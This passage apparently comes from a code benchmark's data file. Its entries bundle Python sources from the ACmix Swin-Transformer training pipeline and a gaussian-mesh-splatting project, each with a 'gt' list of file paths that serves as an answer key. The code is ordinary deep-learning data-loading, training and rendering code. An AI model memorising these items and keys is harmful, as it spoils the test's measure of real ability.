cached {index}/{n_sample} takes {t:.2f}s per block')\n                start_time = time.time()\n            path, target = self.samples[index]\n            if self.cache_mode == \"full\":\n                samples_bytes[index] = (ZipReader.read(path), target)\n            elif self.cache_mode == \"part\" and index % world_size == global_rank:\n                samples_bytes[index] = (ZipReader.read(path), target)\n            else:\n                samples_bytes[index] = (path, target)\n        self.samples = samples_bytes\n\n    def __getitem__(self, index):\n\n        path, target = self.samples[index]\n        sample = self.loader(path)\n        if self.transform is not None:\n            sample = self.transform(sample)\n        if self.target_transform is not None:\n            target = self.target_transform(target)\n\n        return sample, target\n\n    def __len__(self):\n        return len(self.samples)\n\n    def __repr__(self):\n        fmt_str = 'Dataset ' + self.__class__.__name__ + '\\n'\n        fmt_str += '    Number of datapoints: {}\\n'.format(self.__len__())\n        fmt_str += '    Root Location: {}\\n'.format(self.root)\n        tmp = '    Transforms (if any): '\n        fmt_str += '{0}{1}\\n'.format(tmp, self.transform.__repr__().replace('\\n', '\\n' + ' ' * len(tmp)))\n        tmp = '    Target Transforms (if any): '\n        fmt_str += '{0}{1}'.format(tmp, self.target_transform.__repr__().replace('\\n', '\\n' + ' ' * len(tmp)))\n        return fmt_str\n\n\nIMG_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.ppm', '.bmp', '.pgm', '.tif']\n\n\ndef pil_loader(path):\n\n    if isinstance(path, bytes):\n        img = Image.open(io.BytesIO(path))\n    elif is_zip_path(path):\n        data = ZipReader.read(path)\n        img = Image.open(io.BytesIO(data))\n    else:\n        with open(path, 'rb') as f:\n            img = Image.open(f)\n    return img.convert('RGB')\n\n\ndef accimage_loader(path):\n    import accimage\n    try:\n        return accimage.Image(path)\n    except IOError:\n\n        return pil_loader(path)\n\n\ndef default_img_loader(path):\n    from torchvision import get_image_backend\n    if get_image_backend() == 'accimage':\n        return accimage_loader(path)\n    else:\n        return pil_loader(path)\n\n\nclass CachedImageFolder(DatasetFolder):\n\n\n    def __init__(self, root, ann_file='', img_prefix='', transform=None, target_transform=None,\n                 loader=default_img_loader, cache_mode=\"no\"):\n        super(CachedImageFolder, self).__init__(root, loader, IMG_EXTENSIONS,\n                                                ann_file=ann_file, img_prefix=img_prefix,\n                                                transform=transform, target_transform=target_transform,\n                                                cache_mode=cache_mode)\n        self.imgs = self.samples\n\n    def __getitem__(self, index):\n\n        path, target = self.samples[index]\n        image = self.loader(path)\n        if self.transform is not None:\n            img = self.transform(image)\n        else:\n            img = image\n        if self.target_transform is not None:\n            target = self.target_transform(target)\n\n        return img, target\n\n'ACmix/Swin-Transformer/data/__init__.py'\n:from .build import build_loader\n'ACmix/Swin-Transformer/data/build.py'\n:\n\n\n\n\n\n\nimport os\nimport torch\nimport numpy as np\nimport torch.distributed as dist\nfrom torchvision import datasets, transforms\nfrom timm.data.constants import IMAGENET_DEFAULT_MEAN, IMAGENET_DEFAULT_STD\nfrom timm.data import Mixup\nfrom timm.data import create_transform\nfrom timm.data.transforms import _pil_interp\n\nfrom .cached_image_folder import CachedImageFolder\nfrom .samplers import SubsetRandomSampler\n\n\ndef build_loader(config):\n    config.defrost()\n    dataset_train, config.MODEL.NUM_CLASSES = build_dataset(is_train=True, config=config)\n    config.freeze()\n    print(f\"local rank {config.LOCAL_RANK} / global rank {dist.get_rank()} successfully build train dataset\")\n    dataset_val, _ = build_dataset(is_train=False, config=config)\n    print(f\"local rank {config.LOCAL_RANK} / global rank {dist.get_rank()} successfully build val dataset\")\n\n    num_tasks = dist.get_world_size()\n    global_rank = dist.get_rank()\n    if config.DATA.ZIP_MODE and config.DATA.CACHE_MODE == 'part':\n        indices = np.arange(dist.get_rank(), len(dataset_train), dist.get_world_size())\n        sampler_train = SubsetRandomSampler(indices)\n    else:\n        sampler_train = torch.utils.data.DistributedSampler(\n            dataset_train, num_replicas=num_tasks, rank=global_rank, shuffle=True\n        )\n\n    indices = np.arange(dist.get_rank(), len(dataset_val), dist.get_world_size())\n    sampler_val = SubsetRandomSampler(indices)\n\n    data_loader_train = torch.utils.data.DataLoader(\n        dataset_train, sampler=sampler_train,\n        batch_size=config.DATA.BATCH_SIZE,\n        num_workers=config.DATA.NUM_WORKERS,\n        pin_memory=config.DATA.PIN_MEMORY,\n        drop_last=True,\n    )\n\n    data_loader_val = torch.utils.data.DataLoader(\n        dataset_val, sampler=sampler_val,\n        batch_size=config.DATA.BATCH_SIZE,\n        shuffle=False,\n        num_workers=config.DATA.NUM_WORKERS,\n        pin_memory=config.DATA.PIN_MEMORY,\n        drop_last=False\n    )\n\n\n    mixup_fn = None\n    mixup_active = config.AUG.MIXUP > 0 or config.AUG.CUTMIX > 0. or config.AUG.CUTMIX_MINMAX is not None\n    if mixup_active:\n        mixup_fn = Mixup(\n            mixup_alpha=config.AUG.MIXUP, cutmix_alpha=config.AUG.CUTMIX, cutmix_minmax=config.AUG.CUTMIX_MINMAX,\n            prob=config.AUG.MIXUP_PROB, switch_prob=config.AUG.MIXUP_SWITCH_PROB, mode=config.AUG.MIXUP_MODE,\n            label_smoothing=config.MODEL.LABEL_SMOOTHING, num_classes=config.MODEL.NUM_CLASSES)\n\n    return dataset_train, dataset_val, data_loader_train, data_loader_val, mixup_fn\n\n\ndef build_dataset(is_train, config):\n    transform = build_transform(is_train, config)\n    if config.DATA.DATASET == 'imagenet':\n        prefix = 'train' if is_train else 'val'\n        if config.DATA.ZIP_MODE:\n            ann_file = prefix + \"_map.txt\"\n            prefix = prefix + \".zip@/\"\n            dataset = CachedImageFolder(config.DATA.DATA_PATH, ann_file, prefix, transform,\n                                        cache_mode=config.DATA.CACHE_MODE if is_train else 'part')\n        else:\n            root = os.path.join(config.DATA.DATA_PATH, prefix)\n            dataset = datasets.ImageFolder(root, transform=transform)\n        nb_classes = 1000\n    else:\n        raise NotImplementedError(\"We only support ImageNet Now.\")\n\n    return dataset, nb_classes\n\n\ndef build_transform(is_train, config):\n    resize_im = config.DATA.IMG_SIZE > 32\n    if is_train:\n\n        transform = create_transform(\n            input_size=config.DATA.IMG_SIZE,\n            is_training=True,\n            color_jitter=config.AUG.COLOR_JITTER if config.AUG.COLOR_JITTER > 0 else None,\n            auto_augment=config.AUG.AUTO_AUGMENT if config.AUG.AUTO_AUGMENT != 'none' else None,\n            re_prob=config.AUG.REPROB,\n            re_mode=config.AUG.REMODE,\n            re_count=config.AUG.RECOUNT,\n            interpolation=config.DATA.INTERPOLATION,\n        )\n        if not resize_im:\n\n\n            transform.transforms[0] = transforms.RandomCrop(config.DATA.IMG_SIZE, padding=4)\n        return transform\n\n    t = []\n    if resize_im:\n        if config.TEST.CROP:\n            size = int((256 / 224) * config.DATA.IMG_SIZE)\n            t.append(\n                transforms.Resize(size, interpolation=_pil_interp(config.DATA.INTERPOLATION)),\n\n            )\n            t.append(transforms.CenterCrop(config.DATA.IMG_SIZE))\n        else:\n            t.append(\n                transforms.Resize((config.DATA.IMG_SIZE, config.DATA.IMG_SIZE),\n                                  interpolation=_pil_interp(config.DATA.INTERPOLATION))\n            )\n\n    t.append(transforms.ToTensor())\n    t.append(transforms.Normalize(IMAGENET_DEFAULT_MEAN, IMAGENET_DEFAULT_STD))\n    return transforms.Compose(t)\n\n'ACmix/Swin-Transformer/main.py'\n:\n\n\n\n\n\n\nimport os\nimport time\nimport argparse\nimport datetime\nimport numpy as np\n\nimport torch\nimport torch.backends.cudnn as cudnn\nimport torch.distributed as dist\n\nfrom timm.loss import LabelSmoothingCrossEntropy, SoftTargetCrossEntropy\nfrom timm.utils import accuracy, AverageMeter\n\nfrom config import get_config\nfrom models import build_model\nfrom data import build_loader\nfrom lr_scheduler import build_scheduler\nfrom optimizer import build_optimizer\nfrom logger import create_logger\nfrom utils import load_checkpoint, save_checkpoint, get_grad_norm, auto_resume_helper, reduce_tensor\n\ntry:\n\n    from apex import amp\nexcept ImportError:\n    amp = None\n\n\ndef parse_option():\n    parser = argparse.ArgumentParser('Swin Transformer training and evaluation script', add_help=False)\n    parser.add_argument('--cfg', type=str, required=True, metavar=\"FILE\", help='path to config file', )\n    parser.add_argument(\n        \"--opts\",\n        help=\"Modify config options by adding 'KEY VALUE' pairs. \",\n        default=None,\n        nargs='+',\n    )\n\n\n    parser.add_argument('--batch-size', type=int, help=\"batch size for single GPU\")\n    parser.add_argument('--data-path', type=str, help='path to dataset')\n    parser.add_argument('--zip', action='store_true', help='use zipped dataset instead of folder dataset')\n    parser.add_argument('--cache-mode', type=str, default='part', choices=['no', 'full', 'part'],\n                        help='no: no cache, '\n                             'full: cache all data, '\n                             'part: sharding the dataset into nonoverlapping pieces and only cache one piece')\n    parser.add_argument('--resume', help='resume from checkpoint')\n    parser.add_argument('--accumulation-steps', type=int, help=\"gradient accumulation steps\")\n    parser.add_argument('--use-checkpoint', action='store_true',\n                        help=\"whether to use gradient checkpointing to save memory\")\n    parser.add_argument('--amp-opt-level', type=str, default='O1', choices=['O0', 'O1', 'O2'],\n                        help='mixed precision opt level, if O0, no amp is used')\n    parser.add_argument('--output', default='output', type=str, metavar='PATH',\n                        help='root of output folder, the full path is <output>/<model_name>/<tag> (default: output)')\n    parser.add_argument('--tag', help='tag of experiment')\n    parser.add_argument('--eval', action='store_true', help='Perform evaluation only')\n    parser.add_argument('--throughput', action='store_true', help='Test throughput only')\n\n\n    parser.add_argument(\"--local_rank\", type=int, required=True, help='local rank for DistributedDataParallel')\n\n    args, unparsed = parser.parse_known_args()\n\n    config = get_config(args)\n\n    return args, config\n\n\ndef main(config):\n    dataset_train, dataset_val, data_loader_train, data_loader_val, mixup_fn = build_loader(config)\n\n    logger.info(f\"Creating model:{config.MODEL.TYPE}/{config.MODEL.NAME}\")\n    model = build_model(config)\n    model.cuda()\n    logger.info(str(model))\n\n    optimizer = build_optimizer(config, model)\n    if config.AMP_OPT_LEVEL != \"O0\":\n        model, optimizer = amp.initialize(model, optimizer, opt_level=config.AMP_OPT_LEVEL)\n    model = torch.nn.parallel.DistributedDataParallel(model, device_ids=[config.LOCAL_RANK], broadcast_buffers=False)\n    model_without_ddp = model.module\n\n    n_parameters = sum(p.numel() for p in model.parameters() if p.requires_grad)\n    logger.info(f\"number of params: {n_parameters}\")\n    if hasattr(model_without_ddp, 'flops'):\n        flops = model_without_ddp.flops()\n        logger.info(f\"number of GFLOPs: {flops / 1e9}\")\n\n    lr_scheduler = build_scheduler(config, optimizer, len(data_loader_train))\n\n    if config.AUG.MIXUP > 0.:\n\n        criterion = SoftTargetCrossEntropy()\n    elif config.MODEL.LABEL_SMOOTHING > 0.:\n        criterion = LabelSmoothingCrossEntropy(smoothing=config.MODEL.LABEL_SMOOTHING)\n    else:\n        criterion = torch.nn.CrossEntropyLoss()\n\n    max_accuracy = 0.0\n\n    if config.TRAIN.AUTO_RESUME:\n        resume_file = auto_resume_helper(config.OUTPUT)\n        if resume_file:\n            if config.MODEL.RESUME:\n                logger.warning(f\"auto-resume changing resume file from {config.MODEL.RESUME} to {resume_file}\")\n            config.defrost()\n            config.MODEL.RESUME = resume_file\n            config.freeze()\n            logger.info(f'auto resuming from {resume_file}')\n        else:\n            logger.info(f'no checkpoint found in {config.OUTPUT}, ignoring auto resume')\n\n    if config.MODEL.RESUME:\n        max_accuracy = load_checkpoint(config, model_without_ddp, optimizer, lr_scheduler, logger)\n        acc1, acc5, loss = validate(config, data_loader_val, model)\n        logger.info(f\"Accuracy of the network on the {len(dataset_val)} test images: {acc1:.1f}%\")\n        if config.EVAL_MODE:\n            return\n\n    if config.THROUGHPUT_MODE:\n        throughput(data_loader_val, model, logger)\n        return\n\n    logger.info(\"Start training\")\n    start_time = time.time()\n    for epoch in range(config.TRAIN.START_EPOCH, config.TRAIN.EPOCHS):\n        data_loader_train.sampler.set_epoch(epoch)\n\n        train_one_epoch(config, model, criterion, data_loader_train, optimizer, epoch, mixup_fn, lr_scheduler)\n        if dist.get_rank() == 0 and (epoch % config.SAVE_FREQ == 0 or epoch == (config.TRAIN.EPOCHS - 1)):\n            save_checkpoint(config, epoch, model_without_ddp, max_accuracy, optimizer, lr_scheduler, logger)\n\n        acc1, acc5, loss = validate(config, data_loader_val, model)\n        logger.info(f\"Accuracy of the network on the {len(dataset_val)} test images: {acc1:.1f}%\")\n        max_accuracy = max(max_accuracy, acc1)\n        logger.info(f'Max accuracy: {max_accuracy:.2f}%')\n\n    total_time = time.time() - start_time\n    total_time_str = str(datetime.timedelta(seconds=int(total_time)))\n    logger.info('Training time {}'.format(total_time_str))\n\n\ndef train_one_epoch(config, model, criterion, data_loader, optimizer, epoch, mixup_fn, lr_scheduler):\n    model.train()\n    optimizer.zero_grad()\n\n    num_steps = len(data_loader)\n    batch_time = AverageMeter()\n    loss_meter = AverageMeter()\n    norm_meter = AverageMeter()\n\n    start = time.time()\n    end = time.time()\n    for idx, (samples, targets) in enumerate(data_loader):\n        samples = samples.cuda(non_blocking=True)\n        targets = targets.cuda(non_blocking=True)\n\n        if mixup_fn is not None:\n            samples, targets = mixup_fn(samples, targets)\n\n        outputs = model(samples)\n\n        if config.TRAIN.ACCUMULATION_STEPS > 1:\n            loss = criterion(outputs, targets)\n            loss = loss / config.TRAIN.ACCUMULATION_STEPS\n            if config.AMP_OPT_LEVEL != \"O0\":\n                with amp.scale_loss(loss, optimizer) as scaled_loss:\n                    scaled_loss.backward()\n                if config.TRAIN.CLIP_GRAD:\n                    grad_norm = torch.nn.utils.clip_grad_norm_(amp.master_params(optimizer), config.TRAIN.CLIP_GRAD)\n                else:\n                    grad_norm = get_grad_norm(amp.master_params(optimizer))\n            else:\n                loss.backward()\n                if config.TRAIN.CLIP_GRAD:\n                    grad_norm = torch.nn.utils.clip_grad_norm_(model.parameters(), config.TRAIN.CLIP_GRAD)\n                else:\n                    grad_norm = get_grad_norm(model.parameters())\n            if (idx + 1) % config.TRAIN.ACCUMULATION_STEPS == 0:\n                optimizer.step()\n                optimizer.zero_grad()\n                lr_scheduler.step_update(epoch * num_steps + idx)\n        else:\n            loss = criterion(outputs, targets)\n            optimizer.zero_grad()\n            if config.AMP_OPT_LEVEL != \"O0\":\n                with amp.scale_loss(loss, optimizer) as scaled_loss:\n                    scaled_loss.backward()\n                if config.TRAIN.CLIP_GRAD:\n                    grad_norm = torch.nn.utils.clip_grad_norm_(amp.master_params(optimizer), config.TRAIN.CLIP_GRAD)\n                else:\n                    grad_norm = get_grad_norm(amp.master_params(optimizer))\n            else:\n                loss.backward()\n                if config.TRAIN.CLIP_GRAD:\n                    grad_norm = torch.nn.utils.clip_grad_norm_(model.parameters(), config.TRAIN.CLIP_GRAD)\n                else:\n                    grad_norm = get_grad_norm(model.parameters())\n            optimizer.step()\n            lr_scheduler.step_update(epoch * num_steps + idx)\n\n        torch.cuda.synchronize()\n\n        loss_meter.update(loss.item(), targets.size(0))\n        norm_meter.update(grad_norm)\n        batch_time.update(time.time() - end)\n        end = time.time()\n\n        if idx % config.PRINT_FREQ == 0:\n            lr = optimizer.param_groups[0]['lr']\n            memory_used = torch.cuda.max_memory_allocated() / (1024.0 * 1024.0)\n            etas = batch_time.avg * (num_steps - idx)\n            logger.info(\n                f'Train: [{epoch}/{config.TRAIN.EPOCHS}][{idx}/{num_steps}]\\t'\n                f'eta {datetime.timedelta(seconds=int(etas))} lr {lr:.6f}\\t'\n                f'time {batch_time.val:.4f} ({batch_time.avg:.4f})\\t'\n                f'loss {loss_meter.val:.4f} ({loss_meter.avg:.4f})\\t'\n                f'grad_norm {norm_meter.val:.4f} ({norm_meter.avg:.4f})\\t'\n                f'mem {memory_used:.0f}MB')\n    epoch_time = time.time() - start\n    logger.info(f\"EPOCH {epoch} training takes {datetime.timedelta(seconds=int(epoch_time))}\")\n\n\n@torch.no_grad()\ndef validate(config, data_loader, model):\n    criterion = torch.nn.CrossEntropyLoss()\n    model.eval()\n\n    batch_time = AverageMeter()\n    loss_meter = AverageMeter()\n    acc1_meter = AverageMeter()\n    acc5_meter = AverageMeter()\n\n    end = time.time()\n    for idx, (images, target) in enumerate(data_loader):\n        images = images.cuda(non_blocking=True)\n        target = target.cuda(non_blocking=True)\n\n\n        output = model(images)\n\n\n        loss = criterion(output, target)\n        acc1, acc5 = accuracy(output, target, topk=(1, 5))\n\n        acc1 = reduce_tensor(acc1)\n        acc5 = reduce_tensor(acc5)\n        loss = reduce_tensor(loss)\n\n        loss_meter.update(loss.item(), target.size(0))\n        acc1_meter.update(acc1.item(), target.size(0))\n        acc5_meter.update(acc5.item(), target.size(0))\n\n\n        batch_time.update(time.time() - end)\n        end = time.time()\n\n        if idx % config.PRINT_FREQ == 0:\n            memory_used = torch.cuda.max_memory_allocated() / (1024.0 * 1024.0)\n            logger.info(\n                f'Test: [{idx}/{len(data_loader)}]\\t'\n                f'Time {batch_time.val:.3f} ({batch_time.avg:.3f})\\t'\n                f'Loss {loss_meter.val:.4f} ({loss_meter.avg:.4f})\\t'\n                f'Acc@1 {acc1_meter.val:.3f} ({acc1_meter.avg:.3f})\\t'\n                f'Acc@5 {acc5_meter.val:.3f} ({acc5_meter.avg:.3f})\\t'\n                f'Mem {memory_used:.0f}MB')\n    logger.info(f' * Acc@1 {acc1_meter.avg:.3f} Acc@5 {acc5_meter.avg:.3f}')\n    return acc1_meter.avg, acc5_meter.avg, loss_meter.avg\n\n\n@torch.no_grad()\ndef throughput(data_loader, model, logger):\n    model.eval()\n\n    for idx, (images, _) in enumerate(data_loader):\n        images = images.cuda(non_blocking=True)\n        batch_size = images.shape[0]\n        for i in range(50):\n            model(images)\n        torch.cuda.synchronize()\n        logger.info(f\"throughput averaged with 30 times\")\n        tic1 = time.time()\n        for i in range(30):\n            model(images)\n        torch.cuda.synchronize()\n        tic2 = time.time()\n        logger.info(f\"batch_size {batch_size} throughput {30 * batch_size / (tic2 - tic1)}\")\n        return\n\n\nif __name__ == '__main__':\n    _, config = parse_option()\n\n    if config.AMP_OPT_LEVEL != \"O0\":\n        assert amp is not None, \"amp not installed!\"\n\n    if 'RANK' in os.environ and 'WORLD_SIZE' in os.environ:\n        rank = int(os.environ[\"RANK\"])\n        world_size = int(os.environ['WORLD_SIZE'])\n        print(f\"RANK and WORLD_SIZE in environ: {rank}/{world_size}\")\n    else:\n        rank = -1\n        world_size = -1\n    torch.cuda.set_device(config.LOCAL_RANK)\n    torch.distributed.init_process_group(backend='nccl', init_method='env://', world_size=world_size, rank=rank)\n    torch.distributed.barrier()\n\n    seed = config.SEED + dist.get_rank()\n    torch.manual_seed(seed)\n    np.random.seed(seed)\n    cudnn.benchmark = True\n\n\n    linear_scaled_lr = config.TRAIN.BASE_LR * config.DATA.BATCH_SIZE * dist.get_world_size() / 512.0\n    linear_scaled_warmup_lr = config.TRAIN.WARMUP_LR * config.DATA.BATCH_SIZE * dist.get_world_size() / 512.0\n    linear_scaled_min_lr = config.TRAIN.MIN_LR * config.DATA.BATCH_SIZE * dist.get_world_size() / 512.0\n\n    if config.TRAIN.ACCUMULATION_STEPS > 1:\n        linear_scaled_lr = linear_scaled_lr * config.TRAIN.ACCUMULATION_STEPS\n        linear_scaled_warmup_lr = linear_scaled_warmup_lr * config.TRAIN.ACCUMULATION_STEPS\n        linear_scaled_min_lr = linear_scaled_min_lr * config.TRAIN.ACCUMULATION_STEPS\n    config.defrost()\n    config.TRAIN.BASE_LR = linear_scaled_lr\n    config.TRAIN.WARMUP_LR = linear_scaled_warmup_lr\n    config.TRAIN.MIN_LR = linear_scaled_min_lr\n    config.freeze()\n\n    os.makedirs(config.OUTPUT, exist_ok=True)\n    logger = create_logger(output_dir=config.OUTPUT, dist_rank=dist.get_rank(), name=f\"{config.MODEL.NAME}\")\n\n    if dist.get_rank() == 0:\n        path = os.path.join(config.OUTPUT, \"config.json\")\n        with open(path, \"w\") as f:\n            f.write(config.dump())\n        logger.info(f\"Full config saved to {path}\")\n\n\n    logger.info(config.dump())\n\n    main(config)\n",
        "gt": [
            "'ACmix/Swin-Transformer/data/cached_image_folder.py'",
            "'ACmix/Swin-Transformer/data/build.py'",
            "'ACmix/Swin-Transformer/data/__init__.py'",
            "'ACmix/Swin-Transformer/main.py'"
        ]
    },
    {
        "files": [
            "'gaussian-mesh-splatting/games/multi_mesh_splatting/utils/graphics_utils.py'",
            "'gaussian-mesh-splatting/scene/__init__.py'",
            "'gaussian-mesh-splatting/scripts/render_from_mesh_to_mesh.py'",
            "'gaussian-mesh-splatting/games/multi_mesh_splatting/scene/dataset_readers.py'",
            "'gaussian-mesh-splatting/games/scenes/__init__.py'",
            "'gaussian-mesh-splatting/games/flame_splatting/scene/dataset_readers.py'"
        ],
        "content": "'gaussian-mesh-splatting/games/multi_mesh_splatting/utils/graphics_utils.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\nimport numpy as np\nimport torch\nfrom typing import NamedTuple\n\n\nclass MultiMeshPointCloud(NamedTuple):\n    alpha: torch.Tensor\n    points: torch.Tensor\n    colors: np.array\n    normals: np.array\n    vertices: np.array\n    faces: np.array\n    triangles: torch.Tensor\n\n\n'gaussian-mesh-splatting/scene/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\nimport os\nimport random\nimport json\nfrom utils.system_utils import searchForMaxIteration\nfrom games.scenes import sceneLoadTypeCallbacks\nfrom scene.gaussian_model import GaussianModel\nfrom arguments import ModelParams\nfrom utils.camera_utils import cameraList_from_camInfos, camera_to_JSON\n\nclass Scene:\n\n    gaussians : GaussianModel\n\n    def __init__(self, args : ModelParams, gaussians : GaussianModel, load_iteration=None, shuffle=True, resolution_scales=[1.0]):\n\n        self.model_path = args.model_path\n        self.loaded_iter = None\n        self.gaussians = gaussians\n\n        if load_iteration:\n            if load_iteration == -1:\n                self.loaded_iter = searchForMaxIteration(os.path.join(self.model_path, \"point_cloud\"))\n            else:\n                self.loaded_iter = load_iteration\n            print(\"Loading trained model at iteration {}\".format(self.loaded_iter))\n\n        self.train_cameras = {}\n        self.test_cameras = {}\n\n        if os.path.exists(os.path.join(args.source_path, \"sparse\")):\n            if args.gs_type == \"gs_multi_mesh\":\n                scene_info = sceneLoadTypeCallbacks[\"Colmap_Mesh\"](\n                    args.source_path, args.images, args.eval, args.num_splats, args.meshes\n                )\n            else:\n                scene_info = sceneLoadTypeCallbacks[\"Colmap\"](args.source_path, args.images, args.eval)\n        elif os.path.exists(os.path.join(args.source_path, \"transforms_train.json\")):\n            if args.gs_type == \"gs_mesh\":\n                print(\"Found transforms_train.json file, assuming Blender_Mesh data set!\")\n                scene_info = sceneLoadTypeCallbacks[\"Blender_Mesh\"](\n                    args.source_path, args.white_background, args.eval, args.num_splats[0]\n                )\n            elif args.gs_type == \"gs_flame\":\n                print(\"Found transforms_train.json file, assuming Flame Blender data set!\")\n                scene_info = sceneLoadTypeCallbacks[\"Blender_FLAME\"](args.source_path, args.white_background, args.eval)\n            else:\n                print(\"Found transforms_train.json file, assuming Blender data set!\")\n                scene_info = sceneLoadTypeCallbacks[\"Blender\"](args.source_path, args.white_background, args.eval)\n        else:\n            assert False, \"Could not recognize scene type!\"\n\n        if not self.loaded_iter:\n            if args.gs_type == \"gs_multi_mesh\":\n                for i, ply_path in enumerate(scene_info.ply_path):\n                    with open(ply_path, 'rb') as src_file, open(os.path.join(self.model_path, f\"input_{i}.ply\") , 'wb') as dest_file:\n                        dest_file.write(src_file.read())\n            else:\n                with open(scene_info.ply_path, 'rb') as src_file, open(os.path.join(self.model_path, \"input.ply\") , 'wb') as dest_file:\n                    dest_file.write(src_file.read())\n            json_cams = []\n            camlist = []\n            if scene_info.test_cameras:\n                camlist.extend(scene_info.test_cameras)\n            if scene_info.train_cameras:\n                camlist.extend(scene_info.train_cameras)\n            for id, cam in enumerate(camlist):\n                json_cams.append(camera_to_JSON(id, cam))\n            with open(os.path.join(self.model_path, \"cameras.json\"), 'w') as file:\n                json.dump(json_cams, file)\n\n        if shuffle:\n            random.shuffle(scene_info.train_cameras)\n            random.shuffle(scene_info.test_cameras)\n\n        self.cameras_extent = scene_info.nerf_normalization[\"radius\"]\n\n        for resolution_scale in resolution_scales:\n            print(\"Loading Training Cameras\")\n            self.train_cameras[resolution_scale] = cameraList_from_camInfos(scene_info.train_cameras, resolution_scale, args)\n            print(\"Loading Test Cameras\")\n            self.test_cameras[resolution_scale] = cameraList_from_camInfos(scene_info.test_cameras, resolution_scale, args)\n\n        if self.loaded_iter:\n            self.gaussians.load_ply(os.path.join(self.model_path,\n                                                           \"point_cloud\",\n                                                           \"iteration_\" + str(self.loaded_iter),\n                                                           \"point_cloud.ply\"))\n            self.gaussians.point_cloud = scene_info.point_cloud\n            if args.gs_type == \"gs_mesh\":\n                self.gaussians.triangles = scene_info.point_cloud.triangles\n        else:\n            self.gaussians.create_from_pcd(scene_info.point_cloud, self.cameras_extent)\n\n    def save(self, iteration):\n        point_cloud_path = os.path.join(self.model_path, \"point_cloud/iteration_{}\".format(iteration))\n        self.gaussians.save_ply(os.path.join(point_cloud_path, \"point_cloud.ply\"))\n\n    def getTrainCameras(self, scale=1.0):\n        return self.train_cameras[scale]\n\n    def getTestCameras(self, scale=1.0):\n        return self.test_cameras[scale]\n'gaussian-mesh-splatting/scripts/render_from_mesh_to_mesh.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\nimport torch\nfrom scene import Scene\nimport os\nfrom tqdm import tqdm\nfrom os import makedirs\nfrom renderer.gaussian_animated_renderer import render\nimport torchvision\nimport trimesh\nfrom utils.general_utils import safe_state\nfrom argparse import ArgumentParser\nfrom arguments import ModelParams, PipelineParams, get_combined_args\nfrom games.mesh_splatting.scene.gaussian_mesh_model import GaussianMeshModel\n\ndef transform_vertices_function(vertices, c=1):\n    vertices = vertices[:, [0, 2, 1]]\n    vertices[:, 1] = -vertices[:, 1]\n    vertices *= c\n    return vertices\n\n\ndef transform_diff(vertices, vertices_diff, t):\n    vertices += vertices_diff * t\n    return vertices\n\n\ndef do_not_transform(vertices, t):\n    return vertices\n\n\ndef render_set(model_path, name, iteration, views, gaussians, pipeline, background):\n    render_path = os.path.join(model_path, name, \"ours_{}\".format(iteration), \"from_mesh_to_mesh_animated\")\n    gts_path = os.path.join(model_path, name, \"ours_{}\".format(iteration), \"gt\")\n\n    makedirs(render_path, exist_ok=True)\n    makedirs(gts_path, exist_ok=True)\n    t = torch.linspace(0, 10 * torch.pi, len(views))\n\n    vertices = gaussians.vertices\n    triangles = vertices[torch.tensor(gaussians.faces).long()].float().cuda()\n\n    mesh_scene1 = trimesh.load(f'../data/ficus/ficus_animate.obj', force='mesh')\n    vertices1 = mesh_scene1.vertices\n    vertices1 = transform_vertices_function(\n        torch.tensor(vertices1),\n    )\n\n    triangles1 = vertices1[torch.tensor(mesh_scene1.faces).long()].float().cuda()\n\n    diff = triangles1 - triangles\n    diff = diff/len(views)\n\n    for idx, view in enumerate(tqdm(views, desc=\"Rendering progress\")):\n        if idx == 0:\n            view_1 = view\n        triangles_new = triangles + diff * idx\n        rendering = render(triangles_new, view_1, gaussians, pipeline, background)[\"render\"]\n        gt = view.original_image[0:3, :, :]\n        torchvision.utils.save_image(rendering, os.path.join(render_path, '{0:05d}'.format(idx) + \".png\"))\n        torchvision.utils.save_image(gt, os.path.join(gts_path, '{0:05d}'.format(idx) + \".png\"))\n\n\ndef render_sets(dataset : ModelParams, iteration : int, pipeline : PipelineParams, skip_train : bool, skip_test : bool):\n    with torch.no_grad():\n        gaussians = GaussianMeshModel(dataset.sh_degree)\n        scene = Scene(dataset, gaussians, load_iteration=iteration, shuffle=False)\n        if hasattr(gaussians, 'update_alpha'):\n            gaussians.update_alpha()\n        if hasattr(gaussians, 'prepare_scaling_rot'):\n            gaussians.prepare_scaling_rot()\n\n        bg_color = [1,1,1] if dataset.white_background else [0, 0, 0]\n        background = torch.tensor(bg_color, dtype=torch.float32, device=\"cuda\")\n\n        if not skip_train:\n             render_set(dataset.model_path, \"train\", scene.loaded_iter, scene.getTrainCameras(), gaussians, pipeline, background)\n\n        if not skip_test:\n             render_set(dataset.model_path, \"test\", scene.loaded_iter, scene.getTestCameras(), gaussians, pipeline, background)\n\n\nif __name__ == \"__main__\":\n\n    parser = ArgumentParser(description=\"Testing script parameters\")\n    model = ModelParams(parser, sentinel=True)\n    pipeline = PipelineParams(parser)\n    parser.add_argument(\"--iteration\", default=-1, type=int)\n    parser.add_argument('--gs_type', type=str, default=\"gs_mesh\")\n    parser.add_argument(\"--num_splats\", nargs=\"+\", type=int, default=[2])\n    parser.add_argument(\"--skip_train\", action=\"store_true\")\n    parser.add_argument(\"--skip_test\", action=\"store_true\")\n    parser.add_argument(\"--quiet\", action=\"store_true\")\n    args = get_combined_args(parser)\n    model.gs_type = args.gs_type\n    model.num_splats = args.num_splats\n    print(\"Rendering \" + args.model_path)\n\n\n    safe_state(args.quiet)\n\n    render_sets(model.extract(args), args.iteration, pipeline.extract(args), args.skip_train, args.skip_test)\n'gaussian-mesh-splatting/games/multi_mesh_splatting/scene/dataset_readers.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\nimport os\nimport numpy as np\nimport trimesh\nimport torch\n\nfrom games.multi_mesh_splatting.utils.graphics_utils import MultiMeshPointCloud\nfrom scene.dataset_readers import (\n    readColmapSceneInfo,\n    readNerfSyntheticInfo,\n    getNerfppNorm,\n    SceneInfo,\n    storePly\n)\nfrom utils.sh_utils import SH2RGB\n\nfrom scene.colmap_loader import (\n    read_extrinsics_text,\n    read_intrinsics_text,\n    read_extrinsics_binary,\n    read_intrinsics_binary\n)\n\nfrom scene.dataset_readers import readColmapCameras\n\ndef readColmapMeshSceneInfo(path, images, eval, num_splats, meshes, llffhold=8):\n    try:\n        cameras_extrinsic_file = os.path.join(path, \"sparse/0\", \"images.bin\")\n        cameras_intrinsic_file = os.path.join(path, \"sparse/0\", \"cameras.bin\")\n        cam_extrinsics = 